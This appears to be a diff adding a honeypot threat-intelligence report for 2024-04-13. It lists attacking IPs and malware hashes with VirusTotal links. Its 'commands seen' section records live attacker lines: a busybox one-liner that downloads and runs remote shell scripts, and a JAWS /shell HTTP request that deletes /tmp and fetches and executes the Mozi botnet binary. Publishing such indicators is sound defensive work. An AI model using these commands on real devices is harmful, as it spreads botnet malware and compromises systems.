@@ -1,0 +1,40 @@
+Top 5 IPs for 2024-04-13 :
+
+121.29.1.94
+43.153.177.52
+150.109.196.110
+139.59.10.188
+152.228.164.249
+
+Malware Download:
+
+e0830fe6073e891a127a6d725e1e008eeed5515ead315aa9d449ecabd216a7bf
+https://www.virustotal.com/gui/file/e0830fe6073e891a127a6d725e1e008eeed5515ead315aa9d449ecabd216a7bf
+340c8464c2007ce3f80682e15dfafa4180b641d53c14201b929906b7b0284d87
+https://www.virustotal.com/gui/file/340c8464c2007ce3f80682e15dfafa4180b641d53c14201b929906b7b0284d87
+0be7775f9f25be439da91248cabb9592dedb0e8be0ca182c218e9e0a222228b0
+https://www.virustotal.com/gui/file/0be7775f9f25be439da91248cabb9592dedb0e8be0ca182c218e9e0a222228b0
+0d3c687ffc30e185b836b99bd07fa2b0d460a090626f6bbbd40a95b98ea70257
+https://www.virustotal.com/gui/file/0d3c687ffc30e185b836b99bd07fa2b0d460a090626f6bbbd40a95b98ea70257
+1013c9e63d2499cd502ec6e4d1b599413a0902ca1676e49392ae4724267738fd
+\https://www.virustotal.com/gui/file/1013c9e63d2499cd502ec6e4d1b599413a0902ca1676e49392ae4724267738fd
+76ae6d577ba96b1c3a1de8b21c32a9faf6040f7e78d98269e0469d896c29dc64
+https://www.virustotal.com/gui/file/76ae6d577ba96b1c3a1de8b21c32a9faf6040f7e78d98269e0469d896c29dc64
+a1b6223a3ecb37b9f7e4a52909a08d9fd8f8f80aee46466127ea0f078c7f5437
+https://www.virustotal.com/gui/file/a1b6223a3ecb37b9f7e4a52909a08d9fd8f8f80aee46466127ea0f078c7f5437
+d7188b8c575367e10ea8b36ec7cca067ef6ce6d26ffa8c74b3faa0b14ebb8ff0
+https://www.virustotal.com/gui/file/d7188b8c575367e10ea8b36ec7cca067ef6ce6d26ffa8c74b3faa0b14ebb8ff0
+
+
+Malcious Commands seen:
+
+cd /data/local/tmp/; busybox wget http://14.225.213.142/w.sh; sh w.sh; curl http://14.225.213.142/c.sh; sh c.sh; wget http://14.225.213.142/wget.sh; sh wget.sh; curl http://14.225.213.142/wget.sh; sh wget.sh; busybox wget http://14.225.213.142/wget.sh; sh wget.sh; busybox curl http://14.225.213.142/wget.sh; sh wget.sh
+
+GET /shell?cd+/tmp;rm+-rf+*;wget+http://123.129.3.163:38593/Mozi.7;chmod+777+Mozi.7;/tmp/Mozi.7+jaws HTTP/1.1
+User-Agent: Hello, world
+Host: <HOST-IP>
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Connection: keep-alive
+
+
+
